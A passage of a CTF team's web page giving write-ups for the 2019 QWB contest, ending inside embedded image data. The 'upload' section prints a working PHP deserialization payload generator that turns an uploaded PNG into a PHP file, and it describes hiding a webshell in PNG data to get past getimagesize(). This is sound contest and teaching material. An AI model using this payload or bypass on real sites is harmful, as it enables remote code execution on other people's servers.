<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>2019 强网杯 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/4.ddc6d2f6.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>2019 强网杯</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2019-qwb.html#签到" class="sidebar-link">签到</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#upload" class="sidebar-link">upload</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#随便注" class="sidebar-link">随便注</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#高明的黑客-writeup" class="sidebar-link">高明的黑客 Writeup</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#强网先锋-上单" class="sidebar-link">强网先锋-上单</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#强网先锋-辅助" class="sidebar-link">强网先锋-辅助</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#强网先锋-打野" class="sidebar-link">强网先锋-打野</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#强网先锋-ap" class="sidebar-link">强网先锋-AP</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#random-study" class="sidebar-link">Random Study</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#初始阶段" class="sidebar-link">初始阶段</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第一阶段" class="sidebar-link">第一阶段</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第二阶段" class="sidebar-link">第二阶段</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第三阶段" class="sidebar-link">第三阶段</a></li></ul></li><li><a href="/writeup/2019-qwb.html#copperstudy" class="sidebar-link">copperstudy</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第一层" class="sidebar-link">第一层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第二层" class="sidebar-link">第二层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第三层" class="sidebar-link">第三层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第四层" class="sidebar-link">第四层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第五层" class="sidebar-link">第五层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#第六层" class="sidebar-link">第六层</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#参考链接" class="sidebar-link">参考链接</a></li></ul></li><li><a href="/writeup/2019-qwb.html#鲲or鳗orgame" class="sidebar-link">鲲or鳗orGame</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-qwb.html#justre" class="sidebar-link">JustRe</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#太长不看" class="sidebar-link">太长不看</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#check1" class="sidebar-link">check1</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#check2" class="sidebar-link">check2</a></li></ul></li><li><a href="/writeup/2019-qwb.html#webassembly" class="sidebar-link">Webassembly</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#太长不看-2" class="sidebar-link">太长不看</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#main" class="sidebar-link">_main</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#f15" class="sidebar-link">f15</a></li></ul></li><li><a href="/writeup/2019-qwb.html#设备固件" class="sidebar-link">设备固件</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#太长不看-3" class="sidebar-link">太长不看</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#main-2" class="sidebar-link">main</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#chk1" class="sidebar-link">chk1</a></li><li class="sidebar-sub-header"><a href="/writeup/2019-qwb.html#chk2" class="sidebar-link">chk2</a></li></ul></li><li><a href="/writeup/2019-qwb.html#强网先锋-ad" class="sidebar-link">强网先锋-AD</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="_2019-强网杯"><a href="#_2019-强网杯" class="header-anchor">#</a> 2019 强网杯</h1> <p>一年比一年难，虽然得到了三位大佬的助攻，还两度进入前24，到最后还是无缘决赛（为什么神仙这么可怕啊）。</p> <h2 id="签到"><a href="#签到" class="header-anchor">#</a> 签到</h2> <p>ctrl-C，ctrl-V，不解释</p> <h2 id="upload"><a href="#upload" class="header-anchor">#</a> upload</h2> <p>发现源码文件<code>www.tar.gz</code>，下载后解压。是一个基于 thinkphp5 的 web app，在 controller 里有四个文件，在<code>Index.php</code>中发现一个反序列化。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">profile</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">profile_db</span><span class="token operator">=</span><span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ID&quot;</span><span class="token punctuation">,</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_diff</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">profile_db</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">profile</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>在 Register.php 里发现类析构函数，会调用<code>$this-&gt;checker-&gt;index()</code>函数。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">registed</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checker</span><span class="token operator">-&gt;</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>在 Profile.php 中有一个<code>__call</code>的魔术方法，可以造成一个动态函数调用</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>由此可以够造出一个完整的调用链，执行<code>upload_img()</code>函数，将上传的 png 文件重命名为 php 文件。</p> <p>最后构造这样的 php 产生 payload，第一个坑点是我一开始没有写命名空间导致一直报错，直到队友把完整的题目环境搭起来，开了调试才发现问题。第二个是以为 php 报错中断之后不会析构，其实是由于没有命名空间，反序列化出来的一直是<code>__PHP_Incomplete_Class</code>，所以 PHP 报错中断之后也会执行析构函数。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Profile</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$index</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checker</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">index</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;upload_img&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">upload_menu</span><span class="token operator">=</span> <span class="token string double-quoted-string">&quot;6f65da3924c6557308caff5b2801eed4&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">ext</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename_tmp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;../public/upload/6f65da3924c6557308caff5b2801eed4/0a7b8575f81e6d28645879810e6f43a9.png&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;../public/upload/6f65da3924c6557308caff5b2801eed4/a.php&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Register</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$registed</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checker</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>关于 webshell，只需要在 PNG 头部与第一个 CHUNK 之间插入文本数据就可以绕过<code>getimagesize()</code>函数。</p> <p><img src="data:image/png;base64,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